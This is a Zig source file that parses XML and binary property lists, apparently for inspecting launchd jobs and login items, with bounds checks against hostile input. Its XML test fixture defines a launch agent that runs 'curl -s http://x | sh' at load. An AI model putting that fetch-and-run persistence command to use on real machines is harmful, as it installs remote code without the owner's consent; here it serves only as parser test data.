//! Property lists, XML and binary (`bplist00`), decoded into a small value tree allocated from an
//! arena. launchd jobs, login item databases and configuration profiles are plists. Inputs are
//! hostile: depth, object counts, offsets and lengths are bounded and checked.
const std = @import("std");

pub const Error = error{ Malformed, TooDeep, TooLarge, OutOfMemory };

pub const max_depth = 32;
pub const max_objects = 1 << 20;

pub const Value = union(enum) {
    string: []const u8,
    int: i64,
    real: f64,
    bool: bool,
    data: []const u8,
    date: f64,
    uid: u64,
    array: []const Value,
    dict: Dict,
    null,

    pub const Dict = struct {
        keys: []const []const u8,
        values: []const Value,

        pub fn get(d: Dict, key: []const u8) ?Value {
            for (d.keys, d.values) |k, v| if (std.mem.eql(u8, k, key)) return v;
            return null;
        }
    };

    pub fn getString(v: Value, key: []const u8) ?[]const u8 {
        if (v != .dict) return null;
        const x = v.dict.get(key) orelse return null;
        return if (x == .string) x.string else null;
    }

    pub fn getBool(v: Value, key: []const u8) ?bool {
        if (v != .dict) return null;
        const x = v.dict.get(key) orelse return null;
        return if (x == .bool) x.bool else null;
    }

    pub fn getArray(v: Value, key: []const u8) ?[]const Value {
        if (v != .dict) return null;
        const x = v.dict.get(key) orelse return null;
        return if (x == .array) x.array else null;
    }
};

pub fn parse(arena: std.mem.Allocator, bytes: []const u8) Error!Value {
    if (std.mem.startsWith(u8, bytes, "bplist00")) return parseBinary(arena, bytes);
    return parseXml(arena, bytes);
}

// Binary ----------------------------------------------------------------------------------------

const Binary = struct {
    bytes: []const u8,
    offsets: []const u8,
    offset_size: u8,
    ref_size: u8,
    count: u64,
    arena: std.mem.Allocator,
    budget: usize = max_objects,

    fn readUint(b: []const u8) u64 {
        var v: u64 = 0;
        for (b) |x| v = (v << 8) | x;
        return v;
    }

    fn objectOffset(p: *Binary, ref: u64) Error!usize {
        if (ref >= p.count) return error.Malformed;
        const at = ref * p.offset_size;
        if (at + p.offset_size > p.offsets.len) return error.Malformed;
        const off = readUint(p.offsets[@intCast(at)..][0..p.offset_size]);
        if (off >= p.bytes.len) return error.Malformed;
        return @intCast(off);
    }

    fn length(p: *Binary, info: u8, pos: *usize) Error!usize {
        if (info != 0xF) return info;
        if (pos.* >= p.bytes.len) return error.Malformed;
        const marker = p.bytes[pos.*];
        if (marker >> 4 != 1) return error.Malformed;
        const n = @as(usize, 1) << @intCast(marker & 0x3);
        if (pos.* + 1 + n > p.bytes.len) return error.Malformed;
        const v = readUint(p.bytes[pos.* + 1 ..][0..n]);
        pos.* += 1 + n;
        if (v > p.bytes.len) return error.TooLarge;
        return @intCast(v);
    }

    fn take(p: *Binary, pos: usize, n: usize) Error![]const u8 {
        if (pos > p.bytes.len or n > p.bytes.len - pos) return error.Malformed;
        return p.bytes[pos..][0..n];
    }

    fn value(p: *Binary, ref: u64, depth: u32) Error!Value {
        if (depth > max_depth) return error.TooDeep;
        if (p.budget == 0) return error.TooLarge;
        p.budget -= 1;
        var pos = try p.objectOffset(ref);
        const marker = p.bytes[pos];
        pos += 1;
        const info = marker & 0xF;
        switch (marker >> 4) {
            0x0 => return switch (info) {
                0x8 => .{ .bool = false },
                0x9 => .{ .bool = true },
                else => .null,
            },
            0x1 => {
                if (info > 3) return error.Malformed;
                const raw = try p.take(pos, @as(usize, 1) << @intCast(info));
                return .{ .int = @bitCast(readUint(raw)) };
            },
            0x2 => {
                const raw = try p.take(pos, @as(usize, 1) << @intCast(@min(info, 3)));
                return .{ .real = if (raw.len == 8) @bitCast(readUint(raw)) else if (raw.len == 4) @as(f32, @bitCast(@as(u32, @intCast(readUint(raw))))) else 0 };
            },
            0x3 => return .{ .date = @bitCast(readUint(try p.take(pos, 8))) },
            0x4 => {
                const n = try p.length(info, &pos);
                return .{ .data = try p.take(pos, n) };
            },
            0x5 => {
                const n = try p.length(info, &pos);
                return .{ .string = try p.take(pos, n) };
            },
            0x6 => {
                const n = try p.length(info, &pos);
                if (n > p.bytes.len / 2) return error.Malformed;
                const raw = try p.take(pos, n * 2);
                return .{ .string = try utf16beToUtf8(p.arena, raw) };
            },
            0x8 => return .{ .uid = readUint(try p.take(pos, @as(usize, info) + 1)) },
            0xA, 0xC => {
                const n = try p.length(info, &pos);
                const refs = try p.take(pos, n * p.ref_size);
                const items = try p.arena.alloc(Value, n);
                for (items, 0..) |*it, i| it.* = try p.value(readUint(refs[i * p.ref_size ..][0..p.ref_size]), depth + 1);
                return .{ .array = items };
            },
            0xD => {
                const n = try p.length(info, &pos);
                const refs = try p.take(pos, n * 2 * p.ref_size);
                const keys = try p.arena.alloc([]const u8, n);
                const values = try p.arena.alloc(Value, n);
                for (0..n) |i| {
                    const k = try p.value(readUint(refs[i * p.ref_size ..][0..p.ref_size]), depth + 1);
                    keys[i] = if (k == .string) k.string else "";
                    values[i] = try p.value(readUint(refs[(n + i) * p.ref_size ..][0..p.ref_size]), depth + 1);
                }
                return .{ .dict = .{ .keys = keys, .values = values } };
            },
            else => return .null,
        }
    }
};

fn utf16beToUtf8(arena: std.mem.Allocator, raw: []const u8) Error![]const u8 {
    var out: std.ArrayList(u8) = .empty;
    var i: usize = 0;
    while (i + 1 < raw.len) : (i += 2) {
        var cp: u21 = std.mem.readInt(u16, raw[i..][0..2], .big);
        if (cp >= 0xD800 and cp < 0xDC00 and i + 3 < raw.len) {
            const lo = std.mem.readInt(u16, raw[i + 2 ..][0..2], .big);
            if (lo >= 0xDC00 and lo < 0xE000) {
                cp = 0x10000 + ((cp - 0xD800) << 10) + (lo - 0xDC00);
                i += 2;
            } else cp = 0xFFFD;
        } else if (cp >= 0xD800 and cp < 0xE000) cp = 0xFFFD;
        var buf: [4]u8 = undefined;
        const n = std.unicode.utf8Encode(cp, &buf) catch 0;
        try out.appendSlice(arena, buf[0..n]);
    }
    return out.items;
}

pub fn parseBinary(arena: std.mem.Allocator, bytes: []const u8) Error!Value {
    if (bytes.len < 8 + 32) return error.Malformed;
    const t = bytes[bytes.len - 32 ..];
    const offset_size = t[6];
    const ref_size = t[7];
    const count = std.mem.readInt(u64, t[8..16], .big);
    const top = std.mem.readInt(u64, t[16..24], .big);
    const table = std.mem.readInt(u64, t[24..32], .big);
    if (offset_size == 0 or offset_size > 8 or ref_size == 0 or ref_size > 8) return error.Malformed;
    if (count > max_objects or table > bytes.len - 32) return error.Malformed;
    if (count * offset_size > bytes.len - 32 - table) return error.Malformed;
    var p: Binary = .{
        .bytes = bytes[0 .. bytes.len - 32],
        .offsets = bytes[@intCast(table)..][0..@intCast(count * offset_size)],
        .offset_size = offset_size,
        .ref_size = ref_size,
        .count = count,
        .arena = arena,
        // Shared references can make a graph expand exponentially; a document decodes into at
        // most a few values per stored object.
        .budget = @intCast(@min(max_objects, count * 8 + 64)),
    };
    return p.value(top, 0);
}

// XML -------------------------------------------------------------------------------------------

const Xml = struct {
    text: []const u8,
    pos: usize = 0,
    arena: std.mem.Allocator,

    /// The next tag: name, whether it closes (`</x>`), whether it is empty (`<x/>`).
    const Tag = struct { name: []const u8, closing: bool, empty: bool, end: usize };

    fn nextTag(x: *Xml) ?Tag {
        while (true) {
            const lt = std.mem.indexOfScalarPos(u8, x.text, x.pos, '<') orelse return null;
            const gt = std.mem.indexOfScalarPos(u8, x.text, lt, '>') orelse return null;
            x.pos = gt + 1;
            const inner = x.text[lt + 1 .. gt];
            if (inner.len == 0 or inner[0] == '?' or inner[0] == '!') continue;
            var name = inner;
            const closing = name[0] == '/';
            if (closing) name = name[1..];
            const empty = name.len > 0 and name[name.len - 1] == '/';
            if (empty) name = name[0 .. name.len - 1];
            name = std.mem.sliceTo(name, ' ');
            return .{ .name = name, .closing = closing, .empty = empty, .end = gt + 1 };
        }
    }

    /// Text up to `</name>`, entities decoded.
    fn textUntil(x: *Xml, name: []const u8) Error![]const u8 {
        var close_buf: [32]u8 = undefined;
        const close = std.fmt.bufPrint(&close_buf, "</{s}>", .{name}) catch return error.Malformed;
        const end = std.mem.indexOfPos(u8, x.text, x.pos, close) orelse return error.Malformed;
        const raw = x.text[x.pos..end];
        x.pos = end + close.len;
        return decodeEntities(x.arena, raw);
    }

    fn value(x: *Xml, tag: Tag, depth: u32) Error!Value {
        if (depth > max_depth) return error.TooDeep;
        const n = tag.name;
        if (std.mem.eql(u8, n, "true")) return .{ .bool = true };
        if (std.mem.eql(u8, n, "false")) return .{ .bool = false };
        if (tag.empty) {
            if (std.mem.eql(u8, n, "string")) return .{ .string = "" };
            if (std.mem.eql(u8, n, "array")) return .{ .array = &.{} };
            if (std.mem.eql(u8, n, "dict")) return .{ .dict = .{ .keys = &.{}, .values = &.{} } };
            return .null;
        }
        if (std.mem.eql(u8, n, "string")) return .{ .string = try x.textUntil("string") };
        if (std.mem.eql(u8, n, "integer")) return .{ .int = std.fmt.parseInt(i64, std.mem.trim(u8, try x.textUntil("integer"), " \n\t"), 0) catch 0 };
        if (std.mem.eql(u8, n, "real")) return .{ .real = std.fmt.parseFloat(f64, std.mem.trim(u8, try x.textUntil("real"), " \n\t")) catch 0 };
        if (std.mem.eql(u8, n, "data")) return .{ .data = try x.textUntil("data") };
        if (std.mem.eql(u8, n, "date")) {
            _ = try x.textUntil("date");
            return .{ .date = 0 };
        }
        if (std.mem.eql(u8, n, "array")) {
            var items: std.ArrayList(Value) = .empty;
            while (x.nextTag()) |t| {
                if (t.closing) break;
                if (items.items.len >= max_objects) return error.TooLarge;
                try items.append(x.arena, try x.value(t, depth + 1));
            } else return error.Malformed;
            return .{ .array = items.items };
        }
        if (std.mem.eql(u8, n, "dict")) {
            var keys: std.ArrayList([]const u8) = .empty;
            var values: std.ArrayList(Value) = .empty;
            while (x.nextTag()) |t| {
                if (t.closing) break;
                if (!std.mem.eql(u8, t.name, "key")) return error.Malformed;
                const key = if (t.empty) "" else try x.textUntil("key");
                const vt = x.nextTag() orelse return error.Malformed;
                if (vt.closing) return error.Malformed;
                if (keys.items.len >= max_objects) return error.TooLarge;
                try keys.append(x.arena, key);
                try values.append(x.arena, try x.value(vt, depth + 1));
            } else return error.Malformed;
            return .{ .dict = .{ .keys = keys.items, .values = values.items } };
        }
        return error.Malformed;
    }
};

fn decodeEntities(arena: std.mem.Allocator, raw: []const u8) Error![]const u8 {
    if (std.mem.indexOfScalar(u8, raw, '&') == null) return raw;
    var out: std.ArrayList(u8) = .empty;
    var i: usize = 0;
    while (i < raw.len) {
        if (raw[i] == '&') {
            const ents = [_]struct { e: []const u8, c: u8 }{ .{ .e = "&lt;", .c = '<' }, .{ .e = "&gt;", .c = '>' }, .{ .e = "&amp;", .c = '&' }, .{ .e = "&quot;", .c = '"' }, .{ .e = "&apos;", .c = '\'' } };
            var matched = false;
            for (ents) |e| if (std.mem.startsWith(u8, raw[i..], e.e)) {
                try out.append(arena, e.c);
                i += e.e.len;
                matched = true;
                break;
            };
            if (matched) continue;
        }
        try out.append(arena, raw[i]);
        i += 1;
    }
    return out.items;
}

pub fn parseXml(arena: std.mem.Allocator, text: []const u8) Error!Value {
    var x: Xml = .{ .text = text, .arena = arena };
    while (x.nextTag()) |t| {
        if (std.mem.eql(u8, t.name, "plist")) continue;
        if (t.closing) return error.Malformed;
        return x.value(t, 0);
    }
    return error.Malformed;
}

/// Every string in a value tree (for databases whose structure is an NSKeyedArchiver graph).
pub fn collectStrings(arena: std.mem.Allocator, v: Value, out: *std.ArrayList([]const u8), depth: u32) Error!void {
    if (depth > max_depth) return;
    switch (v) {
        .string => |s| try out.append(arena, s),
        .array => |a| for (a) |x| try collectStrings(arena, x, out, depth + 1),
        .dict => |d| for (d.values) |x| try collectStrings(arena, x, out, depth + 1),
        else => {},
    }
}

test "XML plist" {
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    const v = try parse(arena.allocator(),
        \\<?xml version="1.0" encoding="UTF-8"?>
        \\<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        \\<plist version="1.0">
        \\<dict>
        \\  <key>Label</key><string>com.example.agent</string>
        \\  <key>ProgramArguments</key>
        \\  <array><string>/bin/sh</string><string>-c</string><string>curl -s http://x | sh &amp;&amp; true</string></array>
        \\  <key>RunAtLoad</key><true/>
        \\  <key>StartInterval</key><integer>300</integer>
        \\  <key>Empty</key><string/>
        \\</dict>
        \\</plist>
    );
    try std.testing.expectEqualStrings("com.example.agent", v.getString("Label").?);
    try std.testing.expect(v.getBool("RunAtLoad").?);
    const args = v.getArray("ProgramArguments").?;
    try std.testing.expectEqual(@as(usize, 3), args.len);
    try std.testing.expectEqualStrings("curl -s http://x | sh && true", args[2].string);
    try std.testing.expectEqual(@as(i64, 300), v.dict.get("StartInterval").?.int);
    try std.testing.expectError(error.Malformed, parse(arena.allocator(), "<plist><dict><key>a</key>"));
}

test "binary plist" {
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    // {"Label": "com.x", "RunAtLoad": true, "ProgramArguments": ["/tmp/a"]}, written by plutil.
    const v = try parse(arena.allocator(), &fixture_bplist);
    try std.testing.expectEqualStrings("com.x", v.getString("Label").?);
    try std.testing.expect(v.getBool("RunAtLoad").?);
    try std.testing.expectEqualStrings("/tmp/a", v.getArray("ProgramArguments").?[0].string);
    var bad = fixture_bplist;
    bad[bad.len - 1] = 0xff; // offset table beyond the file
    try std.testing.expectError(error.Malformed, parse(arena.allocator(), &bad));
}

pub const fixture_bplist = [_]u8{
    0x62, 0x70, 0x6c, 0x69, 0x73, 0x74, 0x30, 0x30, 0xd3, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x55,
    0x4c, 0x61, 0x62, 0x65, 0x6c, 0x59, 0x52, 0x75, 0x6e, 0x41, 0x74, 0x4c, 0x6f, 0x61, 0x64, 0x5f,
    0x10, 0x10, 0x50, 0x72, 0x6f, 0x67, 0x72, 0x61, 0x6d, 0x41, 0x72, 0x67, 0x75, 0x6d, 0x65, 0x6e,
    0x74, 0x73, 0x55, 0x63, 0x6f, 0x6d, 0x2e, 0x78, 0x09, 0xa1, 0x07, 0x56, 0x2f, 0x74, 0x6d, 0x70,
    0x2f, 0x61, 0x08, 0x0f, 0x15, 0x1f, 0x32, 0x38, 0x39, 0x3b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x42,
};
